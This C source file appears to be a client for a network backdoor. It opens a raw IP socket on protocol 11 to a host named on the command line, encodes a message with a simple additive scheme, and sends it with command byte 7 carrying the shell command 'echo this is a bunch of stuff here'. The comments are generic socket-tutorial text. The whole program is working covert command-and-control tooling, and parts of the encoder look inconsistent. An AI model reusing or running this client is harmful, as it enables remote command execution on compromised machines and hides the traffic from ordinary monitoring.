#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netdb.h>
#include <stdio.h>

encryptData(A8, Ac, A10)
/* length */ int  A8;
/* input message */ unsigned char Ac[];
/* return PTR */ unsigned char A10[];

{
long eax,ecx,edx,al;

    eax = sprintf(A10, "%c", Ac[23]);
    ecx = 1;
    if(1 != A8) {
        do {
            edx = A10[ecx - 1] & 255;
            eax = edx + (Ac[ecx] & 255) + 23;
            A10[ecx] = eax;
            ecx = ecx + 1;
        } while(ecx != A8);
    }
}

main(int argc,char *argv[])
{
	int sock;
	struct sockaddr_in server;
	struct hostent *server_data;
	unsigned char mydata[2048];
	unsigned char MSG[2048];

memset(MSG,0,2048);
strcpy(MSG,"XXecho this is a bunch of stuff here");

// We create a socket as before: a datagram socket in the INTERNET domain with the default protocol:

if ((sock = socket(AF_INET, SOCK_RAW, 11)) < 0){
		perror("socket() call");
		exit(1);
	}

/*In the command line we specify the server name, not its address. gethostbyname() returns a structure containing the 
address of the server.*/

if((server_data = gethostbyname(argv[1])) == 0){
		fprintf(stderr, "%s: unknown host",argv[1]);
		exit(2);
	}

/*We set the data necessary to send the message to the server: the server address, port and protocol family. Note the 
conversion from the host's number representation to the network representation, htons().*/

memcpy(&server.sin_addr,server_data->h_addr, server_data->h_length);
	server.sin_family = AF_INET;
	server.sin_port = htons(atoi(argv[2]));

// At last we send the message, close the socket and exit the program:


MSG[0]=0;
MSG[1]=7;  /* PAE- Command for the switch (remember to add 1 !) */
encryptData(400,MSG,mydata+2);
mydata[0]=2;
mydata[1]=0;
if (sendto(sock,mydata,400, 0, (struct sockaddr *) &server, sizeof server)< 0)
		perror("sendto() call ");
	close(sock);
	exit(0);
}


